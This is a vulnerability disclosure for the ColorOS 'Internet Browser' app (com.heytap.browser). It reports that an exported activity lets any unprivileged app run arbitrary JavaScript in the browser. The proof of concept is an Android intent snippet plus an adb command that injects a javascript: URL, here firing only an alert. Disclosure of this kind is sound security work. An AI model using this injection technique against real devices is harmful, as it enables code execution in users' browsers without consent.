## Vulnerability Report

### Overview:
A vulnerability has been discovered in the `com.heytap.browser` application on the Android platform. The vulnerability allows an attacker to execute arbitrary JavsScript code within the context of the application without any permissions.

### Application Details:

- **Vendor:** - ColorOS
- **Application Name:** 'Internet Browser' `com.heytap.browser`
- **Version:** 45.10.3.4.1
- **Component:** com.android.browser.RealBrowserActivity

### Vulnerability Details:

- **Vulnerability Type:** JavaScript Code Execution
- **Attack Vector:** Via an exported activity component
- **Permissions Required:** None

### Description:

The `com.android.browser.RealBrowserActivity` activity in the `com.heytap.browser` app is exported and can be invoked by any third-party application without requiring any permissions. A malicious app can exploit this to execute arbitrary JavaScript code within the context of the `com.heytap.browser`` application.


### Proof of Concept (PoC):


```
{
        super.onCreate(savedInstanceState);

        String javaScriptCommand = "javascript:alert%28%27Test%20Alert%27%29%3B";

        Intent intent = new Intent(Intent.ACTION_VIEW);
        intent.setData(Uri.parse(javaScriptCommand));
        intent.setClassName("com.heytap.browser", "com.android.browser.RealBrowserActivity");

        startActivity(intent);

        finish();
    }
```

```

adb shell am start -a android.intent.action.VIEW -d "javascript:alert%28%27Test%20Alert%27%29%3B" -n com.heytap.browser/com.android.browser.RealBrowserActivity

```

![poc-coloros](https://github.com/actuator/com.heytap.browser/assets/78701239/952f08c7-b8d6-4982-80bb-28b693b20134)




### Impact:

Successful exploitation allows an attacker to:
- Execute arbitrary JavaScript code within the context of the `com.heytap.browser` app.


